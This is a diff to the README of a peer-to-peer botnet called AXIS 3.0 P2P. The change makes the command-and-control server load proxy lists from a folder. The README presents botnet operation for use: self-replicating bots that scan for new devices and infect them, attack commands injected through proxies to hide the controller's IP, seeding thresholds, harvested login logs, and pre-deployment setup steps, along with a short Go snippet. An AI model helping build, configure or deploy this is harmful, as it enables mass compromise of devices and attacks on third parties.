@@ -8,7 +8,7 @@ AXIS 3.0 P2P is a fully decentralized peer-to-peer botnet using **torrent-style 
 
 1. **Torrent-style P2P distribution**: Bots download ALL binaries from the P2P network, not from a central HTTP server. Every bot is a seeder.
 2. **Self-replication built-in**: All scanners from `scanners-exploits/` are integrated into every bot binary. Every infected device immediately starts scanning for new targets.
-3. **CNC joins via proxies**: The C&C server doesn't expose its real IP. It joins the P2P network through proxy peers to spread attack commands while staying shielded.
+3. **CNC joins via proxy lists**: The C&C server doesn't expose its real IP. It loads proxy lists from the `proxies/` folder and uses them to inject attack commands into the P2P network while staying shielded.
 4. **Auto-seed control**: CNC stops seeding binaries when the network reaches 200 bots. If the network dips below 200, it resumes seeding.
 5. **Every bot = seeder + attacker**: Bots serve binaries to peers while executing attacks and running scanners simultaneously.
 
@@ -40,7 +40,7 @@ AXIS 3.0 P2P is a fully decentralized peer-to-peer botnet using **torrent-style 
 │  ├─ Admin Panel (port 6969, TLS)                                  │
 │  ├─ REST API (port 3779)                                          │
 │  └─ P2P Injector                                                  │
-│      ├─ Joins network via PROXY peers (shields CNC IP)           │
+│      ├─ Loads proxy lists from proxies/ folder (shields CNC IP) │
 │      ├─ Sends attack commands through P2P                        │
 │      └─ Auto-seed control:                                        │
 │          • Bots >= 200 → STOP seeding binaries                   │
@@ -149,15 +149,12 @@ All scanners from `scanners-exploits/` are now built into `bot/selfrep.c`:
 
 ### 4. C&C Server (`cnc/`)
 
-**Proxy-Based Command Injection:**
-The CNC doesn't send commands directly to bots. Instead, it joins the P2P network through **proxy peers** to shield its real IP address.
+**Proxy List-Based Command Injection:**
+The CNC doesn't send commands directly to bots. Instead, it loads proxy lists from the `proxies/` folder (http.txt, https.txt, socks4.txt, socks5.txt) and uses them to inject attack commands into the P2P network while shielding its real IP address.
 
 ```go
-// In admin.go:
-proxies := []string{
-    // Add proxy peer IPs here to shield CNC IP
-    // "proxy1:49152", "proxy2:49152",
-}
+// In admin.go - proxies loaded from proxies/ folder
+proxies := LoadProxies("proxies/http.txt", "proxies/socks5.txt")
 injector := NewP2PInjector(p2pSeeds, proxies)
 injector.SendAttack(buf)
 ```
@@ -257,7 +254,7 @@ Edit these files:
 ### 2. Start C&C Server
 ```bash
 sudo ./cnc_server
-# Configure proxy peers in admin.go to shield CNC IP
+# Load proxy lists from proxies/ folder to shield CNC IP
 ```
 
 ### 3. Start Seeder (Optional)
@@ -320,7 +317,7 @@ cat logs/logins.txt
 **Before deployment:**
 1. Change default passwords (`admin123` in `cnc/database.json` and `relay/config.go`)
 2. Set real seed peer IPs in all config files
-3. Configure proxy peers in `cnc/admin.go` to shield CNC IP
+3. Load proxy lists into `proxies/` folder (http.txt, socks4.txt, etc.) to shield CNC IP
 4. Set `CNC_ADDR` in `bot/config.h`
 
 ---
